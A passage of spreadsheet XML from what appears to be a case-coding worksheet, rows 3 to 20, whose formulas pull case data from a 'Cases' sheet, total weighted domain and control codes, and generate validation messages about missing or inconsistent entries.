    </row>
    <row r="3">
      <c r="A3" s="11">
        <f>Cases!A3</f>
        <v/>
      </c>
      <c r="B3" s="11">
        <f>Cases!B3</f>
        <v/>
      </c>
      <c r="C3" s="11">
        <f>Cases!C3</f>
        <v/>
      </c>
      <c r="D3" s="11">
        <f>IF(Cases!F3="",LEFT(Cases!G3,120),Cases!F3)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E3:L3)=0,"",SUM(E3:L3))</f>
        <v/>
      </c>
      <c r="AJ3" s="13">
        <f>IF(AI3="","",N(E3)*3+N(F3)*2+N(G3)*2+N(H3)*2+N(I3)*2+N(J3)*3+N(K3)*3+N(L3)*3)</f>
        <v/>
      </c>
      <c r="AK3" s="13">
        <f>IF(AI3="","",COUNTIF(N3:AG3,1))</f>
        <v/>
      </c>
      <c r="AL3" s="13">
        <f>IF(OR(AJ3="",AJ3=0),"",ROUND(100*(AJ3-AK3)/AJ3,1))</f>
        <v/>
      </c>
      <c r="AM3" s="11">
        <f>IF(AI3="","",IF(AI3=0,"No domain coded 1; ","")&amp;IF(M3="","Primary domain missing; ",IF(IFERROR(INDEX(E3:L3,1,M3),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N3:AG3)&lt;&gt;AJ3,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH3="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN3" s="13">
        <f>IF(AND(AI3&lt;&gt;"",AM3=""),1,0)</f>
        <v/>
      </c>
      <c r="AO3" s="14" t="n"/>
    </row>
    <row r="4">
      <c r="A4" s="11">
        <f>Cases!A4</f>
        <v/>
      </c>
      <c r="B4" s="11">
        <f>Cases!B4</f>
        <v/>
      </c>
      <c r="C4" s="11">
        <f>Cases!C4</f>
        <v/>
      </c>
      <c r="D4" s="11">
        <f>IF(Cases!F4="",LEFT(Cases!G4,120),Cases!F4)</f>
        <v/>
      </c>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c r="AH4" s="12" t="n"/>
      <c r="AI4" s="13">
        <f>IF(COUNT(E4:L4)=0,"",SUM(E4:L4))</f>
        <v/>
      </c>
      <c r="AJ4" s="13">
        <f>IF(AI4="","",N(E4)*3+N(F4)*2+N(G4)*2+N(H4)*2+N(I4)*2+N(J4)*3+N(K4)*3+N(L4)*3)</f>
        <v/>
      </c>
      <c r="AK4" s="13">
        <f>IF(AI4="","",COUNTIF(N4:AG4,1))</f>
        <v/>
      </c>
      <c r="AL4" s="13">
        <f>IF(OR(AJ4="",AJ4=0),"",ROUND(100*(AJ4-AK4)/AJ4,1))</f>
        <v/>
      </c>
      <c r="AM4" s="11">
        <f>IF(AI4="","",IF(AI4=0,"No domain coded 1; ","")&amp;IF(M4="","Primary domain missing; ",IF(IFERROR(INDEX(E4:L4,1,M4),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N4:AG4)&lt;&gt;AJ4,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH4="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN4" s="13">
        <f>IF(AND(AI4&lt;&gt;"",AM4=""),1,0)</f>
        <v/>
      </c>
      <c r="AO4" s="14" t="n"/>
    </row>
    <row r="5">
      <c r="A5" s="11">
        <f>Cases!A5</f>
        <v/>
      </c>
      <c r="B5" s="11">
        <f>Cases!B5</f>
        <v/>
      </c>
      <c r="C5" s="11">
        <f>Cases!C5</f>
        <v/>
      </c>
      <c r="D5" s="11">
        <f>IF(Cases!F5="",LEFT(Cases!G5,120),Cases!F5)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E5:L5)=0,"",SUM(E5:L5))</f>
        <v/>
      </c>
      <c r="AJ5" s="13">
        <f>IF(AI5="","",N(E5)*3+N(F5)*2+N(G5)*2+N(H5)*2+N(I5)*2+N(J5)*3+N(K5)*3+N(L5)*3)</f>
        <v/>
      </c>
      <c r="AK5" s="13">
        <f>IF(AI5="","",COUNTIF(N5:AG5,1))</f>
        <v/>
      </c>
      <c r="AL5" s="13">
        <f>IF(OR(AJ5="",AJ5=0),"",ROUND(100*(AJ5-AK5)/AJ5,1))</f>
        <v/>
      </c>
      <c r="AM5" s="11">
        <f>IF(AI5="","",IF(AI5=0,"No domain coded 1; ","")&amp;IF(M5="","Primary domain missing; ",IF(IFERROR(INDEX(E5:L5,1,M5),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N5:AG5)&lt;&gt;AJ5,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH5="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN5" s="13">
        <f>IF(AND(AI5&lt;&gt;"",AM5=""),1,0)</f>
        <v/>
      </c>
      <c r="AO5" s="14" t="n"/>
    </row>
    <row r="6">
      <c r="A6" s="11">
        <f>Cases!A6</f>
        <v/>
      </c>
      <c r="B6" s="11">
        <f>Cases!B6</f>
        <v/>
      </c>
      <c r="C6" s="11">
        <f>Cases!C6</f>
        <v/>
      </c>
      <c r="D6" s="11">
        <f>IF(Cases!F6="",LEFT(Cases!G6,120),Cases!F6)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E6:L6)=0,"",SUM(E6:L6))</f>
        <v/>
      </c>
      <c r="AJ6" s="13">
        <f>IF(AI6="","",N(E6)*3+N(F6)*2+N(G6)*2+N(H6)*2+N(I6)*2+N(J6)*3+N(K6)*3+N(L6)*3)</f>
        <v/>
      </c>
      <c r="AK6" s="13">
        <f>IF(AI6="","",COUNTIF(N6:AG6,1))</f>
        <v/>
      </c>
      <c r="AL6" s="13">
        <f>IF(OR(AJ6="",AJ6=0),"",ROUND(100*(AJ6-AK6)/AJ6,1))</f>
        <v/>
      </c>
      <c r="AM6" s="11">
        <f>IF(AI6="","",IF(AI6=0,"No domain coded 1; ","")&amp;IF(M6="","Primary domain missing; ",IF(IFERROR(INDEX(E6:L6,1,M6),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N6:AG6)&lt;&gt;AJ6,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH6="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN6" s="13">
        <f>IF(AND(AI6&lt;&gt;"",AM6=""),1,0)</f>
        <v/>
      </c>
      <c r="AO6" s="14" t="n"/>
    </row>
    <row r="7">
      <c r="A7" s="11">
        <f>Cases!A7</f>
        <v/>
      </c>
      <c r="B7" s="11">
        <f>Cases!B7</f>
        <v/>
      </c>
      <c r="C7" s="11">
        <f>Cases!C7</f>
        <v/>
      </c>
      <c r="D7" s="11">
        <f>IF(Cases!F7="",LEFT(Cases!G7,120),Cases!F7)</f>
        <v/>
      </c>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c r="AA7" s="12" t="n"/>
      <c r="AB7" s="12" t="n"/>
      <c r="AC7" s="12" t="n"/>
      <c r="AD7" s="12" t="n"/>
      <c r="AE7" s="12" t="n"/>
      <c r="AF7" s="12" t="n"/>
      <c r="AG7" s="12" t="n"/>
      <c r="AH7" s="12" t="n"/>
      <c r="AI7" s="13">
        <f>IF(COUNT(E7:L7)=0,"",SUM(E7:L7))</f>
        <v/>
      </c>
      <c r="AJ7" s="13">
        <f>IF(AI7="","",N(E7)*3+N(F7)*2+N(G7)*2+N(H7)*2+N(I7)*2+N(J7)*3+N(K7)*3+N(L7)*3)</f>
        <v/>
      </c>
      <c r="AK7" s="13">
        <f>IF(AI7="","",COUNTIF(N7:AG7,1))</f>
        <v/>
      </c>
      <c r="AL7" s="13">
        <f>IF(OR(AJ7="",AJ7=0),"",ROUND(100*(AJ7-AK7)/AJ7,1))</f>
        <v/>
      </c>
      <c r="AM7" s="11">
        <f>IF(AI7="","",IF(AI7=0,"No domain coded 1; ","")&amp;IF(M7="","Primary domain missing; ",IF(IFERROR(INDEX(E7:L7,1,M7),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N7:AG7)&lt;&gt;AJ7,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH7="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN7" s="13">
        <f>IF(AND(AI7&lt;&gt;"",AM7=""),1,0)</f>
        <v/>
      </c>
      <c r="AO7" s="14" t="n"/>
    </row>
    <row r="8">
      <c r="A8" s="11">
        <f>Cases!A8</f>
        <v/>
      </c>
      <c r="B8" s="11">
        <f>Cases!B8</f>
        <v/>
      </c>
      <c r="C8" s="11">
        <f>Cases!C8</f>
        <v/>
      </c>
      <c r="D8" s="11">
        <f>IF(Cases!F8="",LEFT(Cases!G8,120),Cases!F8)</f>
        <v/>
      </c>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c r="AD8" s="12" t="n"/>
      <c r="AE8" s="12" t="n"/>
      <c r="AF8" s="12" t="n"/>
      <c r="AG8" s="12" t="n"/>
      <c r="AH8" s="12" t="n"/>
      <c r="AI8" s="13">
        <f>IF(COUNT(E8:L8)=0,"",SUM(E8:L8))</f>
        <v/>
      </c>
      <c r="AJ8" s="13">
        <f>IF(AI8="","",N(E8)*3+N(F8)*2+N(G8)*2+N(H8)*2+N(I8)*2+N(J8)*3+N(K8)*3+N(L8)*3)</f>
        <v/>
      </c>
      <c r="AK8" s="13">
        <f>IF(AI8="","",COUNTIF(N8:AG8,1))</f>
        <v/>
      </c>
      <c r="AL8" s="13">
        <f>IF(OR(AJ8="",AJ8=0),"",ROUND(100*(AJ8-AK8)/AJ8,1))</f>
        <v/>
      </c>
      <c r="AM8" s="11">
        <f>IF(AI8="","",IF(AI8=0,"No domain coded 1; ","")&amp;IF(M8="","Primary domain missing; ",IF(IFERROR(INDEX(E8:L8,1,M8),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N8:AG8)&lt;&gt;AJ8,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH8="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN8" s="13">
        <f>IF(AND(AI8&lt;&gt;"",AM8=""),1,0)</f>
        <v/>
      </c>
      <c r="AO8" s="14" t="n"/>
    </row>
    <row r="9">
      <c r="A9" s="11">
        <f>Cases!A9</f>
        <v/>
      </c>
      <c r="B9" s="11">
        <f>Cases!B9</f>
        <v/>
      </c>
      <c r="C9" s="11">
        <f>Cases!C9</f>
        <v/>
      </c>
      <c r="D9" s="11">
        <f>IF(Cases!F9="",LEFT(Cases!G9,120),Cases!F9)</f>
        <v/>
      </c>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c r="AA9" s="12" t="n"/>
      <c r="AB9" s="12" t="n"/>
      <c r="AC9" s="12" t="n"/>
      <c r="AD9" s="12" t="n"/>
      <c r="AE9" s="12" t="n"/>
      <c r="AF9" s="12" t="n"/>
      <c r="AG9" s="12" t="n"/>
      <c r="AH9" s="12" t="n"/>
      <c r="AI9" s="13">
        <f>IF(COUNT(E9:L9)=0,"",SUM(E9:L9))</f>
        <v/>
      </c>
      <c r="AJ9" s="13">
        <f>IF(AI9="","",N(E9)*3+N(F9)*2+N(G9)*2+N(H9)*2+N(I9)*2+N(J9)*3+N(K9)*3+N(L9)*3)</f>
        <v/>
      </c>
      <c r="AK9" s="13">
        <f>IF(AI9="","",COUNTIF(N9:AG9,1))</f>
        <v/>
      </c>
      <c r="AL9" s="13">
        <f>IF(OR(AJ9="",AJ9=0),"",ROUND(100*(AJ9-AK9)/AJ9,1))</f>
        <v/>
      </c>
      <c r="AM9" s="11">
        <f>IF(AI9="","",IF(AI9=0,"No domain coded 1; ","")&amp;IF(M9="","Primary domain missing; ",IF(IFERROR(INDEX(E9:L9,1,M9),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N9:AG9)&lt;&gt;AJ9,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH9="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN9" s="13">
        <f>IF(AND(AI9&lt;&gt;"",AM9=""),1,0)</f>
        <v/>
      </c>
      <c r="AO9" s="14" t="n"/>
    </row>
    <row r="10">
      <c r="A10" s="11">
        <f>Cases!A10</f>
        <v/>
      </c>
      <c r="B10" s="11">
        <f>Cases!B10</f>
        <v/>
      </c>
      <c r="C10" s="11">
        <f>Cases!C10</f>
        <v/>
      </c>
      <c r="D10" s="11">
        <f>IF(Cases!F10="",LEFT(Cases!G10,120),Cases!F10)</f>
        <v/>
      </c>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c r="AI10" s="13">
        <f>IF(COUNT(E10:L10)=0,"",SUM(E10:L10))</f>
        <v/>
      </c>
      <c r="AJ10" s="13">
        <f>IF(AI10="","",N(E10)*3+N(F10)*2+N(G10)*2+N(H10)*2+N(I10)*2+N(J10)*3+N(K10)*3+N(L10)*3)</f>
        <v/>
      </c>
      <c r="AK10" s="13">
        <f>IF(AI10="","",COUNTIF(N10:AG10,1))</f>
        <v/>
      </c>
      <c r="AL10" s="13">
        <f>IF(OR(AJ10="",AJ10=0),"",ROUND(100*(AJ10-AK10)/AJ10,1))</f>
        <v/>
      </c>
      <c r="AM10" s="11">
        <f>IF(AI10="","",IF(AI10=0,"No domain coded 1; ","")&amp;IF(M10="","Primary domain missing; ",IF(IFERROR(INDEX(E10:L10,1,M10),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N10:AG10)&lt;&gt;AJ10,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH10="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN10" s="13">
        <f>IF(AND(AI10&lt;&gt;"",AM10=""),1,0)</f>
        <v/>
      </c>
      <c r="AO10" s="14" t="n"/>
    </row>
    <row r="11">
      <c r="A11" s="11">
        <f>Cases!A11</f>
        <v/>
      </c>
      <c r="B11" s="11">
        <f>Cases!B11</f>
        <v/>
      </c>
      <c r="C11" s="11">
        <f>Cases!C11</f>
        <v/>
      </c>
      <c r="D11" s="11">
        <f>IF(Cases!F11="",LEFT(Cases!G11,120),Cases!F11)</f>
        <v/>
      </c>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c r="AD11" s="12" t="n"/>
      <c r="AE11" s="12" t="n"/>
      <c r="AF11" s="12" t="n"/>
      <c r="AG11" s="12" t="n"/>
      <c r="AH11" s="12" t="n"/>
      <c r="AI11" s="13">
        <f>IF(COUNT(E11:L11)=0,"",SUM(E11:L11))</f>
        <v/>
      </c>
      <c r="AJ11" s="13">
        <f>IF(AI11="","",N(E11)*3+N(F11)*2+N(G11)*2+N(H11)*2+N(I11)*2+N(J11)*3+N(K11)*3+N(L11)*3)</f>
        <v/>
      </c>
      <c r="AK11" s="13">
        <f>IF(AI11="","",COUNTIF(N11:AG11,1))</f>
        <v/>
      </c>
      <c r="AL11" s="13">
        <f>IF(OR(AJ11="",AJ11=0),"",ROUND(100*(AJ11-AK11)/AJ11,1))</f>
        <v/>
      </c>
      <c r="AM11" s="11">
        <f>IF(AI11="","",IF(AI11=0,"No domain coded 1; ","")&amp;IF(M11="","Primary domain missing; ",IF(IFERROR(INDEX(E11:L11,1,M11),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N11:AG11)&lt;&gt;AJ11,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH11="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN11" s="13">
        <f>IF(AND(AI11&lt;&gt;"",AM11=""),1,0)</f>
        <v/>
      </c>
      <c r="AO11" s="14" t="n"/>
    </row>
    <row r="12">
      <c r="A12" s="11">
        <f>Cases!A12</f>
        <v/>
      </c>
      <c r="B12" s="11">
        <f>Cases!B12</f>
        <v/>
      </c>
      <c r="C12" s="11">
        <f>Cases!C12</f>
        <v/>
      </c>
      <c r="D12" s="11">
        <f>IF(Cases!F12="",LEFT(Cases!G12,120),Cases!F12)</f>
        <v/>
      </c>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c r="AC12" s="12" t="n"/>
      <c r="AD12" s="12" t="n"/>
      <c r="AE12" s="12" t="n"/>
      <c r="AF12" s="12" t="n"/>
      <c r="AG12" s="12" t="n"/>
      <c r="AH12" s="12" t="n"/>
      <c r="AI12" s="13">
        <f>IF(COUNT(E12:L12)=0,"",SUM(E12:L12))</f>
        <v/>
      </c>
      <c r="AJ12" s="13">
        <f>IF(AI12="","",N(E12)*3+N(F12)*2+N(G12)*2+N(H12)*2+N(I12)*2+N(J12)*3+N(K12)*3+N(L12)*3)</f>
        <v/>
      </c>
      <c r="AK12" s="13">
        <f>IF(AI12="","",COUNTIF(N12:AG12,1))</f>
        <v/>
      </c>
      <c r="AL12" s="13">
        <f>IF(OR(AJ12="",AJ12=0),"",ROUND(100*(AJ12-AK12)/AJ12,1))</f>
        <v/>
      </c>
      <c r="AM12" s="11">
        <f>IF(AI12="","",IF(AI12=0,"No domain coded 1; ","")&amp;IF(M12="","Primary domain missing; ",IF(IFERROR(INDEX(E12:L12,1,M12),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N12:AG12)&lt;&gt;AJ12,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH12="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN12" s="13">
        <f>IF(AND(AI12&lt;&gt;"",AM12=""),1,0)</f>
        <v/>
      </c>
      <c r="AO12" s="14" t="n"/>
    </row>
    <row r="13">
      <c r="A13" s="11">
        <f>Cases!A13</f>
        <v/>
      </c>
      <c r="B13" s="11">
        <f>Cases!B13</f>
        <v/>
      </c>
      <c r="C13" s="11">
        <f>Cases!C13</f>
        <v/>
      </c>
      <c r="D13" s="11">
        <f>IF(Cases!F13="",LEFT(Cases!G13,120),Cases!F13)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E13:L13)=0,"",SUM(E13:L13))</f>
        <v/>
      </c>
      <c r="AJ13" s="13">
        <f>IF(AI13="","",N(E13)*3+N(F13)*2+N(G13)*2+N(H13)*2+N(I13)*2+N(J13)*3+N(K13)*3+N(L13)*3)</f>
        <v/>
      </c>
      <c r="AK13" s="13">
        <f>IF(AI13="","",COUNTIF(N13:AG13,1))</f>
        <v/>
      </c>
      <c r="AL13" s="13">
        <f>IF(OR(AJ13="",AJ13=0),"",ROUND(100*(AJ13-AK13)/AJ13,1))</f>
        <v/>
      </c>
      <c r="AM13" s="11">
        <f>IF(AI13="","",IF(AI13=0,"No domain coded 1; ","")&amp;IF(M13="","Primary domain missing; ",IF(IFERROR(INDEX(E13:L13,1,M13),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N13:AG13)&lt;&gt;AJ13,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH13="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN13" s="13">
        <f>IF(AND(AI13&lt;&gt;"",AM13=""),1,0)</f>
        <v/>
      </c>
      <c r="AO13" s="14" t="n"/>
    </row>
    <row r="14">
      <c r="A14" s="11">
        <f>Cases!A14</f>
        <v/>
      </c>
      <c r="B14" s="11">
        <f>Cases!B14</f>
        <v/>
      </c>
      <c r="C14" s="11">
        <f>Cases!C14</f>
        <v/>
      </c>
      <c r="D14" s="11">
        <f>IF(Cases!F14="",LEFT(Cases!G14,120),Cases!F14)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E14:L14)=0,"",SUM(E14:L14))</f>
        <v/>
      </c>
      <c r="AJ14" s="13">
        <f>IF(AI14="","",N(E14)*3+N(F14)*2+N(G14)*2+N(H14)*2+N(I14)*2+N(J14)*3+N(K14)*3+N(L14)*3)</f>
        <v/>
      </c>
      <c r="AK14" s="13">
        <f>IF(AI14="","",COUNTIF(N14:AG14,1))</f>
        <v/>
      </c>
      <c r="AL14" s="13">
        <f>IF(OR(AJ14="",AJ14=0),"",ROUND(100*(AJ14-AK14)/AJ14,1))</f>
        <v/>
      </c>
      <c r="AM14" s="11">
        <f>IF(AI14="","",IF(AI14=0,"No domain coded 1; ","")&amp;IF(M14="","Primary domain missing; ",IF(IFERROR(INDEX(E14:L14,1,M14),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N14:AG14)&lt;&gt;AJ14,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH14="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN14" s="13">
        <f>IF(AND(AI14&lt;&gt;"",AM14=""),1,0)</f>
        <v/>
      </c>
      <c r="AO14" s="14" t="n"/>
    </row>
    <row r="15">
      <c r="A15" s="11">
        <f>Cases!A15</f>
        <v/>
      </c>
      <c r="B15" s="11">
        <f>Cases!B15</f>
        <v/>
      </c>
      <c r="C15" s="11">
        <f>Cases!C15</f>
        <v/>
      </c>
      <c r="D15" s="11">
        <f>IF(Cases!F15="",LEFT(Cases!G15,120),Cases!F15)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E15:L15)=0,"",SUM(E15:L15))</f>
        <v/>
      </c>
      <c r="AJ15" s="13">
        <f>IF(AI15="","",N(E15)*3+N(F15)*2+N(G15)*2+N(H15)*2+N(I15)*2+N(J15)*3+N(K15)*3+N(L15)*3)</f>
        <v/>
      </c>
      <c r="AK15" s="13">
        <f>IF(AI15="","",COUNTIF(N15:AG15,1))</f>
        <v/>
      </c>
      <c r="AL15" s="13">
        <f>IF(OR(AJ15="",AJ15=0),"",ROUND(100*(AJ15-AK15)/AJ15,1))</f>
        <v/>
      </c>
      <c r="AM15" s="11">
        <f>IF(AI15="","",IF(AI15=0,"No domain coded 1; ","")&amp;IF(M15="","Primary domain missing; ",IF(IFERROR(INDEX(E15:L15,1,M15),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N15:AG15)&lt;&gt;AJ15,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH15="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN15" s="13">
        <f>IF(AND(AI15&lt;&gt;"",AM15=""),1,0)</f>
        <v/>
      </c>
      <c r="AO15" s="14" t="n"/>
    </row>
    <row r="16">
      <c r="A16" s="11">
        <f>Cases!A16</f>
        <v/>
      </c>
      <c r="B16" s="11">
        <f>Cases!B16</f>
        <v/>
      </c>
      <c r="C16" s="11">
        <f>Cases!C16</f>
        <v/>
      </c>
      <c r="D16" s="11">
        <f>IF(Cases!F16="",LEFT(Cases!G16,120),Cases!F16)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E16:L16)=0,"",SUM(E16:L16))</f>
        <v/>
      </c>
      <c r="AJ16" s="13">
        <f>IF(AI16="","",N(E16)*3+N(F16)*2+N(G16)*2+N(H16)*2+N(I16)*2+N(J16)*3+N(K16)*3+N(L16)*3)</f>
        <v/>
      </c>
      <c r="AK16" s="13">
        <f>IF(AI16="","",COUNTIF(N16:AG16,1))</f>
        <v/>
      </c>
      <c r="AL16" s="13">
        <f>IF(OR(AJ16="",AJ16=0),"",ROUND(100*(AJ16-AK16)/AJ16,1))</f>
        <v/>
      </c>
      <c r="AM16" s="11">
        <f>IF(AI16="","",IF(AI16=0,"No domain coded 1; ","")&amp;IF(M16="","Primary domain missing; ",IF(IFERROR(INDEX(E16:L16,1,M16),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N16:AG16)&lt;&gt;AJ16,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH16="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN16" s="13">
        <f>IF(AND(AI16&lt;&gt;"",AM16=""),1,0)</f>
        <v/>
      </c>
      <c r="AO16" s="14" t="n"/>
    </row>
    <row r="17">
      <c r="A17" s="11">
        <f>Cases!A17</f>
        <v/>
      </c>
      <c r="B17" s="11">
        <f>Cases!B17</f>
        <v/>
      </c>
      <c r="C17" s="11">
        <f>Cases!C17</f>
        <v/>
      </c>
      <c r="D17" s="11">
        <f>IF(Cases!F17="",LEFT(Cases!G17,120),Cases!F17)</f>
        <v/>
      </c>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c r="AD17" s="12" t="n"/>
      <c r="AE17" s="12" t="n"/>
      <c r="AF17" s="12" t="n"/>
      <c r="AG17" s="12" t="n"/>
      <c r="AH17" s="12" t="n"/>
      <c r="AI17" s="13">
        <f>IF(COUNT(E17:L17)=0,"",SUM(E17:L17))</f>
        <v/>
      </c>
      <c r="AJ17" s="13">
        <f>IF(AI17="","",N(E17)*3+N(F17)*2+N(G17)*2+N(H17)*2+N(I17)*2+N(J17)*3+N(K17)*3+N(L17)*3)</f>
        <v/>
      </c>
      <c r="AK17" s="13">
        <f>IF(AI17="","",COUNTIF(N17:AG17,1))</f>
        <v/>
      </c>
      <c r="AL17" s="13">
        <f>IF(OR(AJ17="",AJ17=0),"",ROUND(100*(AJ17-AK17)/AJ17,1))</f>
        <v/>
      </c>
      <c r="AM17" s="11">
        <f>IF(AI17="","",IF(AI17=0,"No domain coded 1; ","")&amp;IF(M17="","Primary domain missing; ",IF(IFERROR(INDEX(E17:L17,1,M17),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N17:AG17)&lt;&gt;AJ17,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH17="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN17" s="13">
        <f>IF(AND(AI17&lt;&gt;"",AM17=""),1,0)</f>
        <v/>
      </c>
      <c r="AO17" s="14" t="n"/>
    </row>
    <row r="18">
      <c r="A18" s="11">
        <f>Cases!A18</f>
        <v/>
      </c>
      <c r="B18" s="11">
        <f>Cases!B18</f>
        <v/>
      </c>
      <c r="C18" s="11">
        <f>Cases!C18</f>
        <v/>
      </c>
      <c r="D18" s="11">
        <f>IF(Cases!F18="",LEFT(Cases!G18,120),Cases!F18)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E18:L18)=0,"",SUM(E18:L18))</f>
        <v/>
      </c>
      <c r="AJ18" s="13">
        <f>IF(AI18="","",N(E18)*3+N(F18)*2+N(G18)*2+N(H18)*2+N(I18)*2+N(J18)*3+N(K18)*3+N(L18)*3)</f>
        <v/>
      </c>
      <c r="AK18" s="13">
        <f>IF(AI18="","",COUNTIF(N18:AG18,1))</f>
        <v/>
      </c>
      <c r="AL18" s="13">
        <f>IF(OR(AJ18="",AJ18=0),"",ROUND(100*(AJ18-AK18)/AJ18,1))</f>
        <v/>
      </c>
      <c r="AM18" s="11">
        <f>IF(AI18="","",IF(AI18=0,"No domain coded 1; ","")&amp;IF(M18="","Primary domain missing; ",IF(IFERROR(INDEX(E18:L18,1,M18),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N18:AG18)&lt;&gt;AJ18,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH18="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN18" s="13">
        <f>IF(AND(AI18&lt;&gt;"",AM18=""),1,0)</f>
        <v/>
      </c>
      <c r="AO18" s="14" t="n"/>
    </row>
    <row r="19">
      <c r="A19" s="11">
        <f>Cases!A19</f>
        <v/>
      </c>
      <c r="B19" s="11">
        <f>Cases!B19</f>
        <v/>
      </c>
      <c r="C19" s="11">
        <f>Cases!C19</f>
        <v/>
      </c>
      <c r="D19" s="11">
        <f>IF(Cases!F19="",LEFT(Cases!G19,120),Cases!F19)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E19:L19)=0,"",SUM(E19:L19))</f>
        <v/>
      </c>
      <c r="AJ19" s="13">
        <f>IF(AI19="","",N(E19)*3+N(F19)*2+N(G19)*2+N(H19)*2+N(I19)*2+N(J19)*3+N(K19)*3+N(L19)*3)</f>
        <v/>
      </c>
      <c r="AK19" s="13">
        <f>IF(AI19="","",COUNTIF(N19:AG19,1))</f>
        <v/>
      </c>
      <c r="AL19" s="13">
        <f>IF(OR(AJ19="",AJ19=0),"",ROUND(100*(AJ19-AK19)/AJ19,1))</f>
        <v/>
      </c>
      <c r="AM19" s="11">
        <f>IF(AI19="","",IF(AI19=0,"No domain coded 1; ","")&amp;IF(M19="","Primary domain missing; ",IF(IFERROR(INDEX(E19:L19,1,M19),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N19:AG19)&lt;&gt;AJ19,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH19="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN19" s="13">
        <f>IF(AND(AI19&lt;&gt;"",AM19=""),1,0)</f>
        <v/>
      </c>
      <c r="AO19" s="14" t="n"/>
    </row>
    <row r="20">
      <c r="A20" s="11">
        <f>Cases!A20</f>
        <v/>
      </c>
      <c r="B20" s="11">
        <f>Cases!B20</f>
        <v/>
      </c>
      <c r="C20" s="11">
        <f>Cases!C20</f>
        <v/>
      </c>
      <c r="D20" s="11">
        <f>IF(Cases!F20="",LEFT(Cases!G20,120),Cases!F20)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E20:L20)=0,"",SUM(E20:L20))</f>
        <v/>
      </c>
      <c r="AJ20" s="13">
        <f>IF(AI20="","",N(E20)*3+N(F20)*2+N(G20)*2+N(H20)*2+N(I20)*2+N(J20)*3+N(K20)*3+N(L20)*3)</f>
        <v/>
      </c>
      <c r="AK20" s="13">
        <f>IF(AI20="","",COUNTIF(N20:AG20,1))</f>
        <v/>
      </c>
      <c r="AL20" s="13">
        <f>IF(OR(AJ20="",AJ20=0),"",ROUND(100*(AJ20-AK20)/AJ20,1))</f>
        <v/>
      </c>
      <c r="AM20" s="11">
